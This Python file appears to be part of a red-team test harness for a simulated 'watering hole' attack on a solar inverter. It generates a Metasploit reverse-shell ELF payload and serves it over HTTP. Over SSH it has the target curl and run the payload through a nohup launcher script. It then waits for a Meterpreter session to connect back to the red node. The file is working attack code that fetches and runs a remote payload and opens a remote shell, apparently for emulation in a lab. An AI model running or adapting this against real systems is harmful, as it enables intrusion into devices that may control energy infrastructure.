import logging
import os
import http.server
import shutil
import socket
import socketserver
import tempfile
import time

from pymetasploit3.msfrpc import MeterpreterSession, MsfRpcClient  # type: ignore
from threading import Thread

from controller.Attack import Attack
from controller.settings import (
    RED_NODE_IP_ADDRESS,
    INVERTER_IP_ADDRESS,
    TARGET_PLATFORM,
    INVERTER_SSH_USER,
    INVERTER_SSH_PASSWORD,
    INVERTER_SSH_USER_KEYFILE,
)


class WateringHoleAttack(Attack):
    http_server_port: int = 8000
    httpd: socketserver.TCPServer | None = None
    temp_dir: str | None = None
    server_thread: Thread | None = None

    def __init__(self, methodName: str = "runTest", is_helper: bool = False) -> None:
        """For use as a helper class instead of direct unittest."""
        if not is_helper:
            super().__init__(methodName)

    @classmethod
    def tearDownClass(cls) -> None:
        """Enhanced cleanup to prevent port conflicts."""
        try:
            # Clean up HTTP server with enhanced error handling
            if hasattr(cls, "httpd") and cls.httpd:
                try:
                    cls.httpd.shutdown()
                    cls.httpd.server_close()
                    logging.info("HTTP server shutdown completed")
                except Exception as e:
                    logging.warning(f"Error shutting down HTTP server: {e}")
                finally:
                    cls.httpd = None

            # Clean up server thread
            if hasattr(cls, "server_thread") and cls.server_thread:
                try:
                    if cls.server_thread.is_alive():
                        cls.server_thread.join(timeout=2)
                except Exception as e:
                    logging.warning(f"Error joining server thread: {e}")
                finally:
                    cls.server_thread = None

            # Clean up temp directory
            if hasattr(cls, "temp_dir") and cls.temp_dir:
                try:
                    shutil.rmtree(cls.temp_dir, ignore_errors=True)
                    logging.info("Temp directory cleanup completed")
                except Exception as e:
                    logging.warning(f"Error cleaning temp directory: {e}")
                finally:
                    cls.temp_dir = None

            # Force port cleanup - wait for OS to release the port
            time.sleep(1)

        except Exception as e:
            logging.error(f"Error in tearDownClass cleanup: {e}")
        finally:
            super().tearDownClass()

    def cleanup_target_processes(self) -> None:
        """Clean up any leftover malware processes and files on the target."""
        # Check if SSH client is available and connected
        if not hasattr(self, "ssh_client") or self.ssh_client is None:
            logging.warning("SSH client not available for cleanup operations")
            return

        cleanup_commands = [
            # Kill any running malware processes
            "pkill -f 'malware$' 2>/dev/null || true",
            "pkill -f malware_launcher 2>/dev/null || true",
            # Remove temporary files
            "rm -f /tmp/malware /tmp/malware_launcher.sh /tmp/malware.lock /tmp/malware.pid /tmp/malware.log 2>/dev/null || true",
        ]

        for cmd in cleanup_commands:
            try:
                # Verify SSH client is still valid before each command
                if self.ssh_client is None:
                    logging.warning(
                        f"SSH client is None, skipping cleanup command: {cmd}"
                    )
                    continue

                if not self.validate_ssh_session(self.ssh_client):
                    logging.warning(
                        f"SSH session invalid, skipping cleanup command: {cmd}"
                    )
                    continue

                self.send_ssh_command_with_random_delays(cmd)
                time.sleep(0.5)  # Brief pause between cleanup commands
            except Exception as e:
                logging.warning(f"Cleanup command failed: {cmd} - {e}")

    def tearDown(self) -> None:
        if hasattr(self, "ssh_client") and self.ssh_client is not None:
            try:
                self.cleanup_target_processes()
            except Exception as e:
                logging.warning(f"Failed to cleanup target processes: {e}")
            finally:
                # Always close SSH connection in tearDown
                try:
                    self.ssh_client.close()
                except Exception as e:
                    logging.warning(f"Failed to close SSH connection: {e}")
                finally:
                    self.ssh_client = None
        super().tearDown()

    def run_watering_hole_phishing(self) -> None:
        """Simulate a watering-hole based phishing attack."""
        self.establish_reverse_shell()

    def set_msf_client(self, msf_client: MsfRpcClient) -> None:
        """Set the msf_client when using as a helper class."""
        self.msf_client = msf_client

    def _validate_handler_listening(self) -> None:
        """Validate that the Metasploit handler is properly listening on port 4444."""
        # Skip validation if we're in a test environment (no real MSF running)
        if hasattr(self, "_test_mode") and self._test_mode:
            logging.info("Test mode detected - skipping handler validation")
            return

        try:
            logging.info("Validating Metasploit handler is listening...")

            # Test connection to the handler port
            with socket.create_connection((RED_NODE_IP_ADDRESS, 4444), timeout=5):
                logging.info("Handler validation successful - port 4444 is listening")
                return

        except (socket.error, socket.timeout) as e:
            # Give handler more time to start up
            logging.warning(
                f"Initial handler validation failed: {e}. Waiting additional time..."
            )
            time.sleep(3)

            try:
                with socket.create_connection((RED_NODE_IP_ADDRESS, 4444), timeout=5):
                    logging.info("Handler validation successful after additional wait")
                    return
            except (socket.error, socket.timeout) as e2:
                # In production, this would be an error, but for testing we'll just warn
                logging.warning(
                    f"Handler validation failed - port 4444 not listening: {e2}"
                )
                if not hasattr(self, "msf_client") or not self.msf_client:
                    # If no MSF client, we're probably in a test - don't fail
                    logging.warning(
                        "No MSF client available - assuming test environment"
                    )
                    return
                raise RuntimeError(
                    f"Handler validation failed - port 4444 not listening: {e2}"
                )

    def establish_reverse_shell(self) -> None:
        """Extracted into separate function to be used by inheriting classes."""
        if self.msf_client is None:
            raise RuntimeError("msf_client not initialized. Call set_msf_client first.")

        # Implement retry mechanism for MSF session establishment
        max_retries = 3
        retry_delay = 5  # seconds between retries

        for attempt in range(max_retries):
            try:
                logging.info(
                    f"MSF session establishment attempt {attempt + 1}/{max_retries}"
                )

                self.temp_dir = tempfile.mkdtemp()

                # Start HTTP server to host the malware
                self.start_http_server(directory=self.temp_dir)

                # Generate and serve the reverse shell payload
                payload = self.generate_reverse_shell_payload(platform=TARGET_PLATFORM)
                self.serve_payload(self.temp_dir, payload)

                # Start Metasploit listener for the reverse shell with enhanced validation
                existing_sessions = self.start_listener(target_platform=TARGET_PLATFORM)

                # Increased delay to ensure handler is fully ready
                time.sleep(5)

                # Validate handler is properly listening before proceeding
                self._validate_handler_listening()

                # Connect to the target system via SSH
                if (
                    INVERTER_IP_ADDRESS is None
                    or INVERTER_SSH_USER is None
                    or (
                        INVERTER_SSH_PASSWORD is None
                        and INVERTER_SSH_USER_KEYFILE is None
                    )
                ):
                    raise ValueError("Missing SSH parameter")

                try:
                    self.start_ssh_session(
                        str(INVERTER_IP_ADDRESS),
                        str(INVERTER_SSH_USER),
                        str(INVERTER_SSH_PASSWORD),
                        str(INVERTER_SSH_USER_KEYFILE),
                    )

                    # Type assertion: ssh_client is guaranteed to be non-None here
                    assert self.ssh_client is not None
                    if not self.validate_ssh_session(self.ssh_client):
                        raise RuntimeError("SSH session validation failed")

                    # Clean up any leftover processes from previous runs
                    self.cleanup_target_processes()

                    # Download and execute the malware on the target
                    download_command = f"curl http://{RED_NODE_IP_ADDRESS}:{self.http_server_port}/malware > /tmp/malware"
                    self.send_ssh_command_with_random_delays(download_command)

                    chmod_command = "chmod +x /tmp/malware"
                    self.send_ssh_command_with_random_delays(chmod_command)

                    # Create a lock file check script with enhanced error handling
                    lock_script_lines = [
                        "#!/bin/bash",
                        'LOCK_FILE="/tmp/malware.lock"',
                        'PID_FILE="/tmp/malware.pid"',
                        'LOG_FILE="/tmp/malware.log"',
                        "",
                        # Function to kill existing malware processes
                        "kill_existing_malware() {",
                        '    for pid in $(pgrep -f "malware$"); do',
                        "        kill -9 $pid 2>/dev/null",
                        "    done",
                        '    for pid in $(pgrep -f "malware_launcher.sh"); do',
                        "        if [ $pid != $$ ]; then",  # Don't kill self
                        "            kill -9 $pid 2>/dev/null",
                        "        fi",
                        "    done",
                        "}",
                        "",
                        # Kill any existing instances first
                        "kill_existing_malware",
                        "",
                        # Check if lock file exists and process is still running
                        'if [ -f "$LOCK_FILE" ]; then',
                        '    OLD_PID=$(cat "$PID_FILE" 2>/dev/null)',
                        '    if [ ! -z "$OLD_PID" ] && kill -0 $OLD_PID 2>/dev/null; then',
                        "        kill -9 $OLD_PID 2>/dev/null",  # Kill the existing process
                        "    fi",
                        '    rm -f "$LOCK_FILE" "$PID_FILE"',  # Clean up old files
                        "fi",
                        "",
                        # Create lock file and store PID
                        'echo $$ > "$PID_FILE"',
                        'touch "$LOCK_FILE"',
                        "",
                        # Add connection test before executing malware
                        'echo "Testing connection to handler..." >> "$LOG_FILE"',
                        f'nc -z {RED_NODE_IP_ADDRESS} 4444 >> "$LOG_FILE" 2>&1',
                        "if [ $? -eq 0 ]; then",
                        '    echo "Handler connection test successful" >> "$LOG_FILE"',
                        "else",
                        '    echo "Handler connection test failed" >> "$LOG_FILE"',
                        "    sleep 2",  # Brief delay before retry
                        "fi",
                        "",
                        # Execute the actual malware with error handling
                        'echo "Starting malware execution..." >> "$LOG_FILE"',
                        "/tmp/malware &",
                        "MALWARE_PID=$!",
                        'echo "Malware PID: $MALWARE_PID" >> "$LOG_FILE"',
                        'echo $MALWARE_PID > "$PID_FILE"',
                        "",
                        # Monitor malware process for a few seconds
                        "sleep 3",
                        "if kill -0 $MALWARE_PID 2>/dev/null; then",
                        '    echo "Malware process is running" >> "$LOG_FILE"',
                        "else",
                        '    echo "Malware process died early" >> "$LOG_FILE"',
                        "fi",
                        "",
                        "wait $MALWARE_PID",
                        "",
                        # Cleanup
                        'rm -f "$LOCK_FILE" "$PID_FILE"',
                    ]

                    with open("/tmp/malware_launcher.sh", "w") as f:
                        f.writelines([f"{x}\n" for x in lock_script_lines])

                    sftp = self.ssh_client.open_sftp()
                    sftp.put("/tmp/malware_launcher.sh", "/tmp/malware_launcher.sh")
                    sftp.close()

                    # Make the launcher script executable
                    chmod_launcher_command = "chmod +x /tmp/malware_launcher.sh"
                    self.send_ssh_command_with_random_delays(chmod_launcher_command)

                    # Execute the launcher script instead of malware directly
                    execute_command = (
                        "nohup /tmp/malware_launcher.sh >/tmp/malware.log 2>&1 &"
                    )
                    self.send_ssh_command_with_random_delays(execute_command)

                    # Brief delay to let malware start
                    time.sleep(3)

                except Exception as e:
                    # Close SSH client only on error, keep it open for cleanup in tearDown
                    if hasattr(self, "ssh_client") and self.ssh_client:
                        try:
                            self.ssh_client.close()
                            self.ssh_client = None
                        except:
                            pass
                    raise Exception(f"SSH connection failed: {str(e)}")
                # Note: SSH client is intentionally kept open for cleanup operations in tearDown()

                # Wait for the reverse shell to connect with enhanced monitoring
                new_session_id = self.wait_for_new_meterpreter_session(
                    existing_sessions
                )
                self.meterpreter_session: MeterpreterSession = (
                    self.msf_client.sessions.session(str(new_session_id))
                )

                if not self.meterpreter_session:
                    raise RuntimeError("Failed to establish stable meterpreter session")

                # Additional validation to ensure session is truly stable
                if not self.validate_msf_session(self.meterpreter_session, retries=5):
                    raise RuntimeError(
                        "MSF session validation failed after establishment"
                    )

                logging.info(
                    f"MSF session established successfully on attempt {attempt + 1}"
                )
                return  # Success - exit retry loop

            except Exception as e:
                logging.warning(
                    f"MSF session establishment attempt {attempt + 1} failed: {str(e)}"
                )

                # Cleanup on failure
                try:
                    if hasattr(self, "temp_dir") and self.temp_dir:
                        import shutil

                        shutil.rmtree(self.temp_dir, ignore_errors=True)
                        self.temp_dir = None

                    if hasattr(self, "httpd") and self.httpd:
                        self.httpd.shutdown()
                        self.httpd.server_close()
                        self.httpd = None

                except Exception as cleanup_error:
                    logging.warning(f"Cleanup error during retry: {cleanup_error}")

                # If this was the last attempt, re-raise the exception
                if attempt == max_retries - 1:
                    raise RuntimeError(
                        f"MSF session establishment failed after {max_retries} attempts. Last error: {str(e)}"
                    )

                # Wait before retrying
                logging.info(f"Waiting {retry_delay} seconds before retry...")
                time.sleep(retry_delay)

    def start_http_server(self, directory: str) -> None:
        """Start a simple HTTP server to host the malware."""
        try:

            class CustomHandler(http.server.SimpleHTTPRequestHandler):
                directory: str = ""

                def __init__(
                    self,
                    request: socket.socket,
                    client_address: tuple[str, int],
                    server: socketserver.BaseServer,
                ) -> None:
                    super().__init__(request, client_address, server)

                def translate_path(self, path: str) -> str:
                    # Force all requests to use our directory
                    return os.path.join(directory, os.path.basename(path))

            CustomHandler.directory = directory
            self.httpd = socketserver.TCPServer(
                ("", self.http_server_port), CustomHandler
            )
            self.httpd.allow_reuse_address = True

            self.server_thread = Thread(target=self.httpd.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()

            # Give the server thread a moment to initialize
            time.sleep(1)

            # Verify server is running
            start_time = time.time()
            while time.time() - start_time < 5:  # 5 second timeout
                try:
                    with socket.create_connection(
                        ("localhost", self.http_server_port), timeout=1
                    ) as sock:
                        return
                except (socket.timeout, socket.error):
                    time.sleep(0.1)

            raise Exception("HTTP server failed to start")
        except Exception as e:
            # Clean up if server failed to start
            if self.httpd:
                self.httpd.shutdown()
                self.httpd.server_close()
            raise Exception(f"Failed to start HTTP server: {str(e)}")

    def generate_reverse_shell_payload(self, platform: str = "linux/x64") -> bytes:
        """Generate a reverse shell payload using Metasploit."""
        logging.info(f"Generating reverse shell payload for '{platform}'")

        # Determine the appropriate payload module path
        module_path = self.get_payload_module_path(platform)
        logging.info(f"Using payload module: {module_path}")

        # Generate the payload
        payload = self.msf_client.modules.use("payload", module_path)
        payload.runoptions["LHOST"] = RED_NODE_IP_ADDRESS
        payload.runoptions["LPORT"] = 4444
        payload.runoptions["Format"] = "elf"

        return bytes(payload.payload_generate())

    def serve_payload(self, directory: str, payload: bytes) -> None:
        """Save the payload to a file and serve it over HTTP."""
        try:
            with open(f"{directory}/malware", "wb") as f:
                f.write(payload)
        except IOError as e:
            raise Exception(f"Failed to write payload: {str(e)}")
